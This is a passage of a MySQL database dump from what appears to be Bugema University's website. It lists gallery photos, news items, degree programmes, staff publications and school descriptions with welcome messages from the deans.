(43, 'BUSASA', 'Activities', 'Zambia', 'includes/gallery/64a5f2975be78_DSC_2786.jpg'),
(44, 'BUCOSA', 'Activities', 'DRC Congo', 'includes/gallery/64a5f2fe73394_DSC_2792.jpg'),
(45, 'BUCOSA', 'Activities', 'DRC Congo', 'includes/gallery/64a5f31f3c9de_DSC_2801.jpg'),
(46, 'BUCOSA', 'Activities', 'DRC Congo', 'includes/gallery/64a5f33b7fa73_DSC_2813.jpg'),
(47, 'BUSSA', 'Activities', 'BUSSA', 'includes/gallery/64a5f35c7c887_DSC_2836.jpg'),
(48, 'BUSSA', 'Activities', 'BUSSA', 'includes/gallery/64a5f395b8f0e_DSC_2846.jpg'),
(49, 'BUSSA', 'Activities', 'BUSSA', 'includes/gallery/64a5f3bb5ba94_DSC_2849.jpg'),
(50, 'BUNSA', 'Activities', 'Uganda', 'includes/gallery/64a5f3fbce1a7_DSC_2890.jpg'),
(51, 'BUNSA', 'Activities', 'Uganda', 'includes/gallery/64a5f42f9a2f7_DSC_2928.jpg'),
(52, 'BURWASA', 'Activities', 'Rwanda', 'includes/gallery/64a5f44bea5d6_DSC_3019.jpg'),
(53, 'BURWASA', 'Activities', 'Rwanda', 'includes/gallery/64a5f460e9c50_DSC_3053.jpg'),
(54, 'BURWASA', 'Activities', 'Rwanda', 'includes/gallery/64a5f4831c5eb_DSC_3056.jpg'),
(55, 'BURWASA', 'Activities', 'Rwanda', 'includes/gallery/64a5f49aed06c_DSC_3059.jpg'),
(56, 'BURWASA', 'Activities', 'Rwanda', 'includes/gallery/64a5f4b6f3811_DSC_3072.jpg'),
(57, 'BURWASA', 'Activities', 'Rwanda', 'includes/gallery/64a5f4d35ef0e_DSC_3103.jpg'),
(58, 'BUBUSA', 'Activities', 'Burundi', 'includes/gallery/64a5f4f5d7bd9_DSC_3121.jpg'),
(59, 'BUBUSA', 'Activities', 'Burundi', 'includes/gallery/64a5f50c397d2_DSC_3124.jpg'),
(60, 'BUBUSA', 'Activities', 'Burundi', 'includes/gallery/64a5f54583936_DSC_3131.jpg'),
(61, 'ALL', 'Activities', 'Flag', 'includes/gallery/64a5f56958b4f_DSC_3190.jpg'),
(62, 'ALL', 'Activities', 'Flag', 'includes/gallery/64a5f58b7ff6a_DSC_3195.jpg'),
(63, 'ALL', 'Activities', 'Flag', 'includes/gallery/64a5f5a87a485_DSC_3196.jpg'),
(64, 'ALL', 'Activities', 'Flag', 'includes/gallery/64a5f5c2f1a70_DSC_3223.jpg'),
(65, 'BUSSA', 'Activities', 'Flag', 'includes/gallery/64a5f5e08588f_DSC_3244.jpg'),
(66, 'BUSSA', 'Activities', 'Flag', 'includes/gallery/64a5f625c3b26_DSC_3249.jpg'),
(67, 'ALL', 'Activities', 'Flag', 'includes/gallery/64a5f63f3b5ae_DSC_3251.jpg'),
(68, 'BUSOMA', 'Activities', 'Flag', 'includes/gallery/64a5f66044dc3_DSC_3257.jpg'),
(69, 'BUSSA', 'Activities', 'Flag', 'includes/gallery/64a5f67774e3b_DSC_3270.jpg'),
(70, 'BUCOSA', 'Activities', 'Flag', 'includes/gallery/64a5f6b77fa6c_DSC_3271.jpg'),
(71, 'BUNSA', 'Activities', 'Uganda', 'includes/gallery/64a5f74f1647d_DSC_3276.jpg'),
(72, 'BUBUSA', 'Activities', 'Burundi', 'includes/gallery/64a5f76a1078e_DSC_3299.jpg'),
(73, 'ALL', 'Activities', 'Flag', 'includes/gallery/64a5f78b87662_DSC_3304.jpg'),
(74, 'BUSASA', 'Activities', 'BUSASA', 'includes/gallery/64a5f7b7e38d9_DSC_3312.jpg'),
(75, 'BUSASA', 'Activities', 'BUSASA', 'includes/gallery/64a5f7da843d7_DSC_3316.jpg'),
(76, 'BUTASA', 'Activities', 'Tanzania', 'includes/gallery/64a5f81bef8fd_DSC_3320.jpg'),
(77, 'BUNSA', 'Activities', 'Uganda', 'includes/gallery/64a5f83fc3fc3_DSC_3327.jpg'),
(78, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5f87b54727_DSC_3387.jpg'),
(79, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5f891eaf84_DSC_3389.jpg'),
(80, 'vollyball', 'sport', 'vollyball', 'includes/gallery/64a5f9051a2bf_IMG_0130.jpg'),
(81, 'jesus', 'sport', 'yesu', 'includes/gallery/64a5f927b3026_DSC_3399.jpg'),
(82, 'vollyball', 'sport', 'vollyball', 'includes/gallery/64a5f953e7888_IMG_0134.jpg'),
(83, 'vollyball', 'sport', 'vollyball', 'includes/gallery/64a5f972f22a8_IMG_0198.jpg'),
(84, 'vollyball', 'sport', 'vollyball', 'includes/gallery/64a5f9c9b1ebf_IMG_0164.jpg'),
(85, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5f9e9c9380_IMG_0790.jpg'),
(86, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5fa003d9b0_IMG_0807.jpg'),
(87, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5fa237d9ba_IMG_0859.jpg'),
(88, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5fa5f84905_IMG_0889.jpg'),
(89, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5fa969d2cb_IMG_1146.jpg'),
(90, 'netball', 'sport', 'netball', 'includes/gallery/64a5fabba08ef_IMG_1285.jpg'),
(91, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5fae2b8cd6_IMG_1200.jpg'),
(92, 'netball', 'sport', 'netball', 'includes/gallery/64a5fb0de4371_IMG_1285.jpg'),
(93, 'football', 'sport', 'football', 'includes/gallery/64a5fb3100ad3_IMG_1712.jpg'),
(94, 'football', 'sport', 'football', 'includes/gallery/64a5fb5b5d722_IMG_1717.jpg'),
(95, 'football', 'sport', 'football', 'includes/gallery/64a5fb7346cb5_IMG_1725.jpg'),
(96, 'basketball', 'sport', 'baskball', 'includes/gallery/64a5fbc656860_IMG_2298.jpg'),
(97, 'basketball', 'sport', 'baskball', 'includes/gallery/64a5fc0ca76e2_IMG_2332.jpg'),
(98, 'basketball', 'sport', 'baskball', 'includes/gallery/64a5fc50c8143_IMG_2405.jpg'),
(99, 'basketball', 'sport', 'baskball', 'includes/gallery/64a5fc6e7a3e5_IMG_2432.jpg'),
(100, 'Woodball', 'sport', 'woodball', 'includes/gallery/64a5fc918fed9_IMG_3033.jpg'),
(101, 'football', 'sport', 'football', 'includes/gallery/64a5fca7310ea_IMG_3069.jpg'),
(102, 'basketball', 'sport', 'baskball', 'includes/gallery/64a5fcc9996d1_IMG_5623.jpg'),
(103, 'basketball', 'sport', 'baskball', 'includes/gallery/64a5fd164915d_IMG_5677.jpg'),
(104, 'BU', 'Environment', 'Palm Avenue', 'includes/gallery/64a5fd4e32143__DSC9238.jpg'),
(105, 'Veep', 'graduation', 'veep', 'includes/gallery/64a5fd6eedc99_IMG_0017.jpg'),
(106, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fd9d4d5d1_IMG_0975.jpg'),
(107, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fdbc78025_IMG_1013.jpg'),
(108, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fdd60e800_IMG_1059.jpg'),
(109, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fe16a11b3_IMG_1027.jpg'),
(110, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fe3a22c10_IMG_1068.jpg'),
(111, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fe62110a8_IMG_1114.jpg'),
(112, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fe8d518b9_IMG_1160.jpg'),
(113, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fea41c5c1_IMG_1172.jpg'),
(114, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5feba538f6_IMG_1176.jpg'),
(115, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fece24647_IMG_1180.jpg'),
(116, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5fee96ab98_IMG_1181.jpg'),
(117, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5ff05dc3e5_IMG_1183.jpg'),
(118, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5ff2504273_IMG_1270.jpg'),
(119, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5ff3bbcee8_IMG_1286.jpg'),
(120, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5ff5403f8d_IMG_1290.jpg'),
(121, 'medical camp', 'sport', 'medical camp', 'includes/gallery/64a5ff734ed98_IMG_1294.jpg'),
(122, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5ff957a7b8_IMG_1297.jpg'),
(123, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5ffaa1d0d2_IMG_1301.jpg'),
(124, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a5ffc9ec9e3_IMG_1336.jpg'),
(125, 'medical camp', 'Activities', 'medical camp', 'includes/gallery/64a5fffb92804_IMG_1340.jpg'),
(126, 'medical camp', 'Health', 'medical camp', 'includes/gallery/64a6002521990_IMG_1359.jpg'),
(127, 'worship', 'worship', 'worship', 'includes/gallery/64a6007e15762_IMG_2291.jpg'),
(128, 'BU', 'Environment', 'BU', 'includes/gallery/64a600abaa4e0_IMG_2326.jpg'),
(129, 'worship', 'worship', 'worship', 'includes/gallery/64a600dddc34c_IMG_2299.jpg'),
(130, 'BU', 'Environment', 'BU', 'includes/gallery/64a60102c2b67_IMG_2331.jpg'),
(131, 'BU', 'Environment', 'BU', 'includes/gallery/64a6015c676f9_IMG_2336.jpg'),
(132, 'worship', 'worship', 'worship', 'includes/gallery/64a6017bd1242_IMG_3500.jpg'),
(133, 'worship', 'worship', 'worship', 'includes/gallery/64a6019e17e3b_IMG_3505.jpg'),
(134, 'worship', 'worship', 'worship', 'includes/gallery/64a601f1c1c0c_IMG_3507.jpg'),
(135, 'worship', 'worship', 'worship', 'includes/gallery/64a60212aeb34_IMG_3510.jpg'),
(136, 'worship', 'worship', 'worship', 'includes/gallery/64a60231090d2_IMG_3517.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `news`
--

CREATE TABLE `news` (
  `id` int(11) NOT NULL,
  `title` varchar(250) NOT NULL,
  `category` varchar(250) NOT NULL,
  `content` longtext NOT NULL,
  `photo` varchar(250) NOT NULL,
  `date` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `news`
--

INSERT INTO `news` (`id`, `title`, `category`, `content`, `photo`, `date`) VALUES
(10, 'New Semster', 'announce', 'The new semester is beginning on 7th August.', 'includes/news/64b8b4b8ed3d8_semester.jpg', '2023-07-20'),
(11, 'Alumni Association Convention', 'Select Category', 'Link for confirmation of attendance : https://forms.gle/9CgzvSd6z8KHxeUp9 \r\n\r\nZoom Link: https://shorturl.at/yQRV8', 'includes/news/64b8b5877e111_WhatsApp Image 2023-07-19 at 4.42.54 PM.jpeg', '2023-07-20');

-- --------------------------------------------------------

--
-- Table structure for table `programs`
--

CREATE TABLE `programs` (
  `id` int(11) NOT NULL,
  `name` varchar(250) NOT NULL,
  `overview` longtext NOT NULL,
  `duration` varchar(250) NOT NULL,
  `requirements` longtext NOT NULL,
  `photo` varchar(250) NOT NULL,
  `department` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `programs`
--

INSERT INTO `programs` (`id`, `name`, `overview`, `duration`, `requirements`, `photo`, `department`) VALUES
(5, 'Bachelor of Humanitarian Emergency and Disaster Management ', 'Overview of issues related to disaster management including a history of the field, key\r\nlegislation impacting the field, comprehensive emergency management and integrated\r\nemergency management, and current issues in the field. Emergency and disaster\r\nmanagement is aimed at introducing and critically analysing key concepts in disaster\r\nmanagement, basic concepts of emergency, disaster, hazard, vulnerability, preparedness,\r\nresponse and recovery will be covered. The course also introduces students to the\r\ngenealogy of various disasters including natural and manmade (technological) and how\r\nthey can be handled in emergency situations.', 'THREE (3) YEARS', 'Two principal passes from Higher Advanced School Certificate (UACE) or its equivalent or do a Higher\r\nEducation Certificate as required by the National Council of Higher Education for a year before you can enter into degree program.', 'includes/programs/64bfddf713f4f_Prog-2.jpg', '9'),
(6, 'Bachelor of Arts in Development Studies', 'This program provides an in-depth introduction to the multi-disciplinary field of\r\ndevelopment studies. It introduces students to key debates in development theory, to the\r\nhistory of development policy and practice, and to the range of multilateral, bilateral and\r\nNGO organizations that are currently engaged in the development enterprise. Through\r\na series of empirically-rich case-studies, drawn from across the developing and newlyindustrialized worlds, the course also looks at the main sectors in which development\r\norganizations engage, including: governance and security, health, education,\r\nenvironmental and natural resource management, and legal reform.', 'THREE (3) YEARS', 'Two principal passes from their Higher Advanced School Certificate or its equivalent or do a Higher Education Certificate as required by the National Council of Higher Education for a year.', 'includes/programs/64c0d2409de58_Pro-1.jpg', '9'),
(7, 'BACHELOR OF THEOLOGY (BTH)', 'The course equips students with the necessary skills for gospel ministry. Based on the\r\nfoundation and propositions of Seventh-day Adventist Church, the course furnishes\r\nstudents with basic tools of interpreting Scripture within the historical grammatical\r\ncontext. Bachelor of Theology (B. Th) is the basic entrance qualification for ministry\r\nin the Seventh-day Adventist Church. Its content reflects the Churchâ€™s conviction that\r\nsuccessful ministry must be based on a deep knowledge of Scripture, an understanding\r\nof the Churchâ€™s theology, history and mission, and competence in pastoral skills relevant\r\nto the needs of the contemporary world. It provides a basis for graduate study in the\r\nbiblical, pastoral and theological areas.', 'THREE (3) YEARS', 'Two (2) principal passes from Higher Advanced School Certificate or its equivalent or do a Higher\r\nEducation Certificate as required by the National Council of Higher Education for a year', 'includes/programs/64c124fa84978_Pro-1.jpg', '11'),
(8, 'Bachelor of Arts in Religious Studies', 'The course equips students with the necessary skills for Gospel Ministry. Based on the\r\nfoundation and Propositions of the Seventh-day Adventist Church, the course furnishes\r\nstudents with basic tools of interpreting scripture within the historical grammatical\r\ncontext.\r\nBachelor of Arts in Religious Studies (BARC) is the basic entrance qualification for\r\nMinistry in the Seventh-day Adventist Church.\r\nIts content reflects an understanding of the churchâ€™s Theology, history, mission and\r\ncompetence in Pastoral skills relevant to the needs of the contemporary world. It provides\r\na basis for graduate study in the Biblical, Pastoral and Theological areas.', 'THREE (3) YEARS', 'Two (2) principal passes from Higher Advanced School Certificate or its equivalent or do a Higher Education Certificate as required by the National Council of Higher Education for a year.', 'includes/programs/64c127573c7f5_Pro-1.jpg', '13'),
(9, 'BACHELOR OF BUSINESS ADMINISTRATION IN ACCOUNTING', 'The program prepares professional accountants to serve across different business sizes.', 'THREE (3) YEARS', 'In addition to meeting the university entrance requirements (2 principal passes), a pass\r\nin English and Mathematics at O-level or its equivalent or passing a placement test, are\r\nrequired.', 'includes/programs/64c12b000d86b_Prog-2.jpg', '14'),
(10, 'BACHELOR OF SCIENCE IN FINANCE AND BANKING', 'The program focusses on producing qualified banking experts.', 'THREE (3) YEARS', 'In addition to meeting the university entrance requirements (2 principal passes), a pass in English and Mathematics at O-level or its equivalent or passing a placement test, are required.', 'includes/programs/64c12cbe58803_Prog-2.jpg', '14'),
(11, 'BACHELOR OF BUSINESS ADMINISTRATION IN INSURANCE', 'The program focusses on training qualified insurance experts to lead the innovations in the sector.', 'THREE (3) YEARS', 'In addition to meeting the university entrance requirements (2 principal passes), a pass in English and Mathematics at O-level or its equivalent or passing a placement test, are required.', 'includes/programs/64c12ecaa592f_Prog-2.jpg', '14');

-- --------------------------------------------------------

--
-- Table structure for table `publications`
--

CREATE TABLE `publications` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `photo` varchar(255) NOT NULL,
  `document` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `publications`
--

INSERT INTO `publications` (`id`, `name`, `title`, `photo`, `document`) VALUES
(3, 'DAVID R MUTEKANGA', 'The Modern Methods Of Farming Adopted By Small Scale Farmers And How They Have Impacted Indigenous Knowledge: The Case Of Kagadi District, Uganda.', 'includes/publication/publication_1689860730_av5.png', 'includes/publication/publication_1689860730_David_R_Mutekanga_Published_Paper_4795_IK_2.pdf'),
(4, 'Lillian Naluwemba Mayanja', 'Determinants of compliance to occupational health and safety measures in construction sites in Kampala Central Division, Kampala city, Uganda', 'includes/publication/publication_1689861020_av5.png', 'includes/publication/publication_1689861020_Determinants of compliance to occupational health and safety measures in construction sites in Kampala.pdf'),
(5, 'Mildred Ayikoru, Christopher Ddamulira, David R Mutekanga', 'Determinants of Employee use of Personal Protective Equipment, the Case of Spedag Interfreight Uganda Limited, Kampala', 'includes/publication/publication_1689861148_av5.png', 'includes/publication/publication_1689861148_Determinats_of_use_of_PPE_in_SPEDAG_Ayikoru_Ddamulira _ Mutekanga.pdf'),
(6, 'Clare Kyomuhendo , Alice Boateng & F. Akosua Agyemang', 'Experiences of elderly women caring for people living with HIV and AIDS in Masindi District, Uganda', 'includes/publication/publication_1689864702_av5.png', 'includes/publication/publication_1689864702_Experiences_of_elderly_women_caring_for_PLWHA.pdf'),
(7, 'Josephine Babirye, Peter Vuzi, David R. Mutekanga', 'Factors Influencing Adherence to Proper Health Care Waste  Management Practices among Health Workers in Wakiso District,  Uganda', 'includes/publication/publication_1689875852_av5.png', 'includes/publication/publication_1689875852_factors_influencing_adherence_to_proper_health_care_waste_management_practices_among_health_workers_in_wakiso_district_uganda.pdf'),
(8, 'Grace Lamunu, Christopher Ddamulira, Florence Ajok Odoch, Paul Katamba and David R. Mutekanga *', 'Factors affecting adherence to meat hygiene practices of beef butcheries in  Kasangati Town Council, Wakiso District, Uganda', 'includes/publication/publication_1689879308_av5.png', 'includes/publication/publication_1689879308_FactorsAffectingAdherencetoMeatHygienePracticesofBeefButcheries.pdf'),
(9, 'Esperence Uwiduhaye Bigaruka, Paul Katamba and David R Mutekanga *', 'Factors influencing deforestation in Rwamwanja refugee settlement camp,  Kamwenge district, Uganda', 'includes/publication/publication_1689879595_av5.png', 'includes/publication/publication_1689879595_FactorsInfluencingDeforestationinRwamwanjaRefugeeSettlementCamp.pdf'),
(10, 'Clare Kyomuhendo1 | Romola Adeola2', 'Green and grey: Nutritional lifestyle and healthful ageing in rural and urban areas of three sub-Saharan African countries', 'includes/publication/publication_1689879746_av5.png', 'includes/publication/publication_1689879746_Green_and_grey_Nutritional_lifestyle_and_healthful_ageing.pdf'),
(11, 'Martin Lubowa1 ; Peter Kibas2 ; Geoffrey Kamau3', 'Influence of Guerrilla Skills on Micro and Small Enterprise Survival  in Wakiso District, Uganda.', 'includes/publication/publication_1689891225_av5.png', 'includes/publication/publication_1689891225_InfluenceOfGuerrillaSkillsOnMicroAndSmallEnterpriseSurvivalInWakisoDistrictUganda.pdf'),
(12, 'Clare Kyomuhendo a,b,* , Alice Boateng c , F. Akosua Agyemang c', 'Support services available for elderly women caring for people living with HIV and AIDS in Masindi District, Uganda', 'includes/publication/publication_1689891341_av5.png', 'includes/publication/publication_1689891341_Kyomuhendo_et_al_(2021)_Support_services_available_for_elderly_women_caring_for_people_living_with_HIV.pdf'),
(13, 'Dr. Serunjogi Charles Dickens (PhD)', 'Parental Involvement and Pupilsâ€™ Welfare in  Government-Aided Primary Schools in Kalongo  Sub-County in Nakasongola District - Uganda', 'includes/publication/publication_1689891391_av5.png', 'includes/publication/publication_1689891391_Parental Involvement and Pupilsâ€™ Welfare in Government-Aided Primary Schools in Kalongo Sub-County in Nakasongola District.pdf'),
(14, 'Dr. Serunjogi Charles Dickens (PhD)', 'Physical Facilities and Teacher Instructional Effectiveness  in Public Primary Schools In Nakaseke District â€“ Uganda', 'includes/publication/publication_1689891444_av5.png', 'includes/publication/publication_1689891444_Physical Facilities and Teacher Instructional Effectiveness in Public Primary Schools In Nakaseke District.pdf'),
(15, 'Havugimana J. D1, Katamba P2, and Mutekanga D. R. 3*', 'INFLUENCE OF MOTORCYCLE (BODA BODA) RIDERâ€™S PRACTICES ON ROAD SAFETY IN  KAMPALA, UGANDA', 'includes/publication/publication_1689891508_av5.png', 'includes/publication/publication_1689891508_Published_paper_on_Bodaboda_Final_7867.pdf'),
(16, 'Charles Dickens Serunjogi, John Ssekamwa and Wilson Muyinda Mande', 'THE EFFECT OF MANAGEMENT DEVELOPMENT ON THE PERFORMANCE OF PUBLIC  PRIMARY SCHOOL HEADTEACHERS IN NAKASONGOLA DISTRICT -UGANDA', 'includes/publication/publication_1689891617_av5.png', 'includes/publication/publication_1689891617_The Effects Of Management Development On The Performance Of Public Primary School Headteachers In Nakasongola District.pdf'),
(17, 'Dr. Serunjogi Charles Dickens (PhD)', 'The Role of School Management Committees and Head teacherâ€™s Effectiveness in Government-Aided Primary Schools in Luweero  District â€“ Uganda', 'includes/publication/publication_1689891672_av5.png', 'includes/publication/publication_1689891672_The Role of School Management Committees and Head teacherâ€™s Effectiveness.pdf'),
(18, 'Mutekanga DR*', 'The Use of Personal Protective Equipment (PPE) during the Covid  19 Pandemic: Developed and Developing Country Review', 'includes/publication/publication_1689891719_av5.png', 'includes/publication/publication_1689891719_the_use_of_personal_protective_equipment_ppe_during_the_covid_19_pandemic_developed_and_developing_country_review.pdf'),
(19, 'Martin Lubowa1 , Geoffrey Kamau2 , Peter Kibas3', 'The Joint Effect of Creative Problem Solving and Perseverance on Micro and  Small Enterprise Survival in Wakiso District, Uganda', 'includes/publication/publication_1689891813_av5.png', 'includes/publication/publication_1689891813_TheJointEffectOfCreativeProblemSolvingAndPerseveranceOnMicroAndSmallEnterpriseSurvivalInWakisoDistrictUganda..pdf'),
(20, 'Eria Muwanguzi, Kibaya Edward, Serunjogi Charles Dickens', 'The Influence of Motivational Factors on Job Satisfaction among the Academic Staff at Makerere University', 'includes/publication/publication_1690268572_av5.png', 'includes/publication/publication_1690268572_IJRPR15552.pdf');

-- --------------------------------------------------------

--
-- Table structure for table `school`
--

CREATE TABLE `school` (
  `id` int(11) NOT NULL,
  `name` varchar(250) NOT NULL,
  `preamble` longtext NOT NULL,
  `goal` mediumtext NOT NULL,
  `photo` varchar(250) NOT NULL,
  `dean` varchar(250) NOT NULL,
  `deans` varchar(250) NOT NULL,
  `message` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `school`
--

INSERT INTO `school` (`id`, `name`, `preamble`, `goal`, `photo`, `dean`, `deans`, `message`) VALUES
(19, 'SCHOOL OF THEOLOGY AND RELIGIOUS STUDIES ', 'The school of Theology and Religious Studies exists to provide spiritual, academic, physical and social development in preparing pastors, evangelists, teachers, counselors, chaplains, leaders, community development promoters and others, for excellence in service of the Seventh-day Adventist Church and the world community. Areas of emphasis include the following: proclamation of the three angelsâ€™ message (Revelation 14:6-12), biblical based education, research and publication, and field practical skills.', 'To prepare ministers of the gospel for effectiveness and efficiency in teaching, preaching, leadership and professional competence within the Seventh-day Adventist Church and the world at large.', 'includes/school/64ba57fe6ec7d_Theology.jpg', 'DR ANTHONY ACHIGA', 'includes/school/64ba57fe6ec87_av5.png', 'The School of Theology and Religious Studies believes that God is the Creator and Sustainer of the universe. In love He sent His Son Jesus Christ to atone for the sins of humanity. The same God has commissioned us to advance His work by pointing fallen human beings to the great sacrifice at Calvary in preparation for the return of our Lord and Savior Jesus Christ.'),
(20, 'SCHOOL OF AGRICULTURE AND APPLIED SCIENCES ', 'Agriculture contributes over 25% directly and 29% indirectly to Ugandaâ€™s GDP and\r\nprovides income to over 75% of Ugandans. Modern agriculture is complex and only\r\nindividuals who have gone through an extended period of preparation in agriculture\r\ncan effectively participate and make a significant contribution in this sector. The logical\r\nbasis of a specialized degree program in agricultural is the need to produce a vital\r\nmass of specialized professional in agriculture who can be producers and also provide\r\nthe required skills for research, innovation and management of crises in agriculture.\r\nThis specialized Bachelor of Science degree program will prepare and produce the\r\nessential manpower for sustainable agriculture, research and innovation of agribusiness\r\nfor employment creation. The graduates will also be sufficiently qualified to assume\r\nresponsibilities in government and the private sector and also set up their own agribusinesses to reduce on the increasing rate of unemployment in Uganda. Therefore, this\r\nproposed program is designed to contribute towards addressing specific setbacks\r\nto sustainable agricultural productivity, and national development through training\r\nand producing graduates with specialized skills in Biotechnology and Plant Breeding;\r\nAnimal Production and Nutrition; Crop Protection and Management; Agronomy and\r\nSoil Fertility and Agribusiness Innovation and Management', 'To produce highly qualified graduates needed in learning and research institutions\r\nand industries\r\nâ€¢ To produce graduates who capable of establishing their own agribusiness enterprises\r\nâ€¢ To promote professional development of graduates in agriculture by providing the\r\nstudents with an understanding and hands-on experience of the different disciplines\r\nof plant breeding, biotechnology, crop science and management, agronomy, animal\r\nnutrition and soil fertility.', 'includes/school/64be6176e6257_school.jpg', 'DR NAMPALA PAUL', 'includes/school/64be6176e6263_av5.png', 'I take this moment to thank you for having considered to join the school of Agriculture and applied sciences.\r\nThe school team is more than ready to produce the best we can from you.\r\nFeel welcome and once again, we are more than glad for your decision.'),
(21, 'SCHOOL OF HEALTH AND ALLIED SCIENCES', 'The school health and allied sciences strives to be recognized as a Centre of Health Education for improvement of peopleâ€™s Wellbeing and providing high quality educational opportunities to students and health care professionals, and advancement of knowledge through scholarship, research and patient care and services.', 'To be a leading center of excellence, providing quality and holistic health care education\r\nand services in Uganda and beyond.', 'includes/school/64be68e13b48a_Health.jpg', 'DR MICHEAL KAYEMBA', 'includes/school/64be68e13b4a1_av5.png', 'I take this opportunity to welcome you to the school of health and allied sciences Bugema University.\r\n\r\nWe are more than committed to producing world class medical experts.\r\nWe shall take you from the class to the hospital for practical classes as we mold the best out of you.\r\nFeel welcome and be ready for the impact soon coming.'),
(22, 'SCHOOL OF SCIENCE AND TECHNOLOGY ', 'The School of Science and Technology prepares professionals that can harness the potentials of computer and information sciences to provide relevant solutions. The School faculty and students are engaged in ongoing research projects and development of computer solutions in the areas of education, health, public administration, information management, ecommerce, and agriculture. The undergraduate and graduate programs offered in both Blended and Online Learning environments focus on Information Systems, Computer Networks Security and Systems Engineering.', 'To produce quality human resource capital that will steer the continent into the next industrial revolution.', 'includes/school/64be70a48b65f_Science.jpg', 'DR LOWU FRANCIS ', 'includes/school/64be70a48b668_av5.png', 'As technology evolves, so are the teaching approaches.\r\nI take the opportunity to welcome you to the school of Science and Technology Bugema University.\r\n\r\nWe shall make you ready for the current and next industrial revolutions to make the planet a better place to live in.\r\nBe ready to take on the current challenges to solve the future problems.'),
(23, 'SCHOOL OF EDUCATION, HUMANITIES AND SOCIAL SCIENCES ', 'The School of Education believes that a true teacher is one that is mentally, physically and spiritually sound to impart the same virtues in his/her learners making them best suited for service to God and mankind in this world and in the world to come.', '1. Train educators in the light of the Seventh day Adventist philosophy of education, which places emphasis on restoring the image of God in mankind through a harmonious development of the physical, mental, spiritual and social powers.\r\n2. Impart in student-teachersâ€™ knowledge and skills that will make them effective and efficient teachers in various levels of education. \r\n3. Equip students with relevant knowledge and skills to enable them assume leadership roles in the educational systems and other institutions of society. \r\n4. Develop educators who will seek to identify themselves with and create a positive impact on the youth who make up a large percentage of our society. \r\n5. Prepare candidates for higher education.\r\n', 'includes/school/64be74c9685aa_school.jpg', 'DR. SSERUNJOGI CHARLES', 'includes/school/64be74c9685b5_av5.png', 'Having made a choice to join the school of education Bugema University, I take this opportunity to welcome you and assure you that you have made the best decision. As school of education, we look forward to serving you with a complete package.'),
(24, 'SCHOOL OF BUSINESS', 'The School of Business believes in integrity and excellence in business dealings. It is therefore dedicated to the education and development of individuals in the region and beyond. These will become business leaders of both private and public organizations through outstanding business-oriented research, instruction, and service. Therefore, the school endeavors to train and produce human resources that are not only professionals but also morally upright.', 'The goal of the School of Business is to train efficient and effective future professionals who integrate integrity and sound business and organizational functions and who are able to combine knowledge with analytical and practical skills in order to accurately define problems, find viable solutions, and implement desirable decisions.', 'includes/school/64be77b65022b_school.jpg', 'DR. LUBOWA MARTIN', 'includes/school/64be77b650235_Dr_Lubowa.jpg', 'As business times evolve, so are the skills needed to run such environments.\r\nThe school of business Bugema University is always evolving to meet the current business trends. We shall equip you with the necessary skills in the areas of accounting, procurement, and management.\r\nYour decision to join us is a perfect one. Looking forward to serving and preparing you for a better future.\r\n'),
(26, 'SCHOOL OF GRADUATE STUDIES, RESEARCH AND PUBLICATIONS', 'Bugema University prides itself in offering relevant accredited and chartered graduate programs. The graduate courses offered at the university are well selected to meet the demands of students, and the satisfaction of stakeholders and society. Many of the activities of the graduate school are research based. Students are motivated to be creative enough to initiate research-based activities which are geared towards finding solutions to challenges of the community.', 'Provide access to post graduate studies to the community', 'includes/school/64be87f99fd81_CAMPUSSES.jpg', 'DR. ROSETTE KABUYE', 'includes/school/64be87f99fd8b_av5.png', 'DEANâ€™S MESSAGE:\r\nSchool of Graduate Studies at Bugema University offers advanced education and research in a novel process that creates knowledge looking at the bigger picture and probing the importance of discovering something new or facts chosen in the field of study.\r\nWe are a self-sustaining graduate school producing skilled manpower for diverse development. And this runs along with the reason of your being here. At this level we expect you to gain higher level skills and more specialized understanding of your subject area. \r\nGraduate students are the keystones of a vibrant, research active university, threading together all aspects of campus life. Every day of graduate life is diverse and full of challenges, including teaching, conducting research, performing, writing, serving, and, yes, recreating. Graduate students are expected to be self-reliant, responsible for what you do and for insuring that you do the work that will be required of you. \r\nWhile we expect you to assume a new level of responsibility, please realize that you are not alone. If you find things difficult do not run away; please seek help. We encourage the faculty and the students to engage in social and scientific research aimed to enhance the development of society and its institutions. \r\nWe reach out to the community, through direct and indirect communication, to disseminate information acquired by means of instruction and research through seminars, conferences, workshops, and different community service and spiritual programs. With the above obligation, I imagined a situation where graduate students display their skills to carry out 